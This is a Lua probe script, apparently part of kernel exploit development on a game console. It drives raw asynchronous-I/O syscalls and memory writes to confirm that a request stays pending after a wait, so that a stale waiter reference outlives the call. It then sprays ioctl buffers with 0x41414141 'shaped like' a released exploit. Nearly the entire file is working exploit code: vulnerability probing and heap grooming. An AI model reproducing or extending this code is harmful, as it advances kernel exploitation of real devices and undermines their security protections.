-- CRASH_CLASS: MODERATE
-- PROBE 778b: multi_wait with the correct 4-byte microsecond timeout
--
-- Context: 778a parked a request in state 2 (in flight) and then wedged the
-- loader because the timeout pointer carried a timespec-shaped buffer whose
-- first dword was 0. The 13.60 body of 663 does "mov edx, 4" before its second
-- copyin (0xffffffff8ad704eb), so the fifth argument is a pointer to ONE
-- uint32 of microseconds, which is what the released exploit passes
-- (waitTimeoutUs = 10000).
--
-- This probe confirms: (a) the wait returns after roughly the requested
-- timeout, (b) it reports the request states, (c) the request is still pending
-- afterwards (so a stale waiter reference would outlive the call), and (d) the
-- table stays healthy.

print("=== PROBE 778b: MULTI_WAIT TIMEOUT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function U(a)
    a = to_num(a)
    return uint64(string.format("0x%08X%08X", math.floor(a / 4294967296), a % 4294967296))
end
local Z = uint64(0)
local function rd(a) return to_num(memory.read_dword(a)) end
local function wd(a, v) memory.write_dword(a, v) end
local function wq(a, v) memory.write_qword(a, v) end
local function hx(v) return string.format("%08X", to_num(v) % 4294967296) end

local function mstime()
    local f = io and io.popen
    return nil
end

local D      = to_num(memory.alloc(0x4000))
local sink   = to_num(memory.alloc(0x2000))
local req    = to_num(memory.alloc(0x1000))
local ids    = to_num(memory.alloc(0x400))
local states = to_num(memory.alloc(0x400))
local idout  = to_num(memory.alloc(0x40))
local tmo    = to_num(memory.alloc(0x40))
for i = 0, 0x3FF do wd(D + i * 4, 0) end
for i = 0, 0x3FF do wd(req + i * 4, 0) end

local SOCKETPAIR, IOCTL = 135, 54
local AIO_DEL, AIO_WAIT, AIO_POLL, AIO_CANCEL, AIO_SUBMIT = 662, 663, 664, 666, 669

local fds = to_num(memory.alloc(64))
local sr = sgn(make_syscall(SOCKETPAIR)(U(1), U(1), U(0), U(fds), Z, Z))
local rfd = rd(fds)
print(string.format("[0] socketpair rv=%d read-fd=%d", sr, rfd))
if sr ~= 0 then return end

local function submit(slot, fd)
    wq(req + slot * 0x40 + 0x00, Z)
    wq(req + slot * 0x40 + 0x08, U(16))
    wq(req + slot * 0x40 + 0x10, U(sink + slot * 0x40))
    wq(req + slot * 0x40 + 0x18, U(sink + 0x1000 + slot * 8))
    wd(req + slot * 0x40 + 0x20, fd)
    wd(req + slot * 0x40 + 0x24, 0)
    local r = sgn(make_syscall(AIO_SUBMIT)(U(1), U(req + slot * 0x40), U(1), U(3), U(idout), Z))
    return r, rd(idout)
end

local function poll_n(n)
    wd(states, 0xDEADBEEF)
    local r = sgn(make_syscall(AIO_POLL)(U(ids), U(n), U(states), Z, Z, Z))
    local out = {}
    for i = 0, n - 1 do out[i] = rd(states + i * 4) end
    return r, out
end

-- three parked reads on one empty socketpair
local N = 3
local idsub = {}
for i = 0, N - 1 do
    local r, id = submit(i, rfd)
    wd(ids + i * 4, id)
    idsub[i] = id
    print(string.format("[A%d] submit ret=%d id=%s", i, r, hx(id)))
end
local pr, ps = poll_n(N)
print(string.format("[A] poll ret=%d states=%s %s %s", pr, hx(ps[0]), hx(ps[1]), hx(ps[2])))

-- wait with a real 10 ms timeout
local function wait_ms(us, tag)
    wd(tmo, us)
    wd(tmo + 4, 0)
    wd(states, 0xDEADBEEF)
    local t0 = os.time()
    local r = sgn(make_syscall(AIO_WAIT)(U(ids), U(N), U(states), Z, U(tmo), Z))
    local dt = os.time() - t0
    print(string.format("[%s] wait(%dus) ret=%d states=%s %s %s elapsed=%ds",
        tag, us, r, hx(rd(states)), hx(rd(states + 4)), hx(rd(states + 8)), dt))
    return r
end
wait_ms(10000, "B")
wait_ms(100000, "C")

-- is the request still pending after the waits?
pr, ps = poll_n(N)
print(string.format("[D] poll after waits ret=%d states=%s %s %s", pr, hx(ps[0]), hx(ps[1]), hx(ps[2])))

-- churn shaped like the exploit: 13 descriptors of 0x28 bytes
local churn = to_num(memory.alloc(0x2000))
for i = 0, 0x7FF do wd(churn + i * 4, 0x41414141) end
local nreq = 13
local cmd = 2147483648 + nreq * 0x28 * 0x10000 + 0x4101
for _, fdv in ipairs({0xFFFFFFFF, rfd, 1, 2}) do
    local r = sgn(make_syscall(IOCTL)(U(fdv), U(cmd), U(churn), Z, Z, Z))
    print(string.format("[E] churn fd=%s ret=%d", hx(fdv), r))
end

-- cleanup: cancel then delete all three
local cr = sgn(make_syscall(AIO_CANCEL)(U(ids), U(N), U(states), Z, Z, Z))
print(string.format("[F] cancel ret=%d states=%s %s %s", cr,
    hx(rd(states)), hx(rd(states + 4)), hx(rd(states + 8))))
pr, ps = poll_n(N)
print(string.format("[F2] poll after cancel ret=%d states=%s %s %s", pr, hx(ps[0]), hx(ps[1]), hx(ps[2])))
local dr = sgn(make_syscall(AIO_DEL)(U(ids), U(N), U(states), Z, Z, Z))
print(string.format("[G] delete ret=%d status=%s %s %s", dr,
    hx(rd(states)), hx(rd(states + 4)), hx(rd(states + 8))))
print("=== PROBE 778b DONE ===")
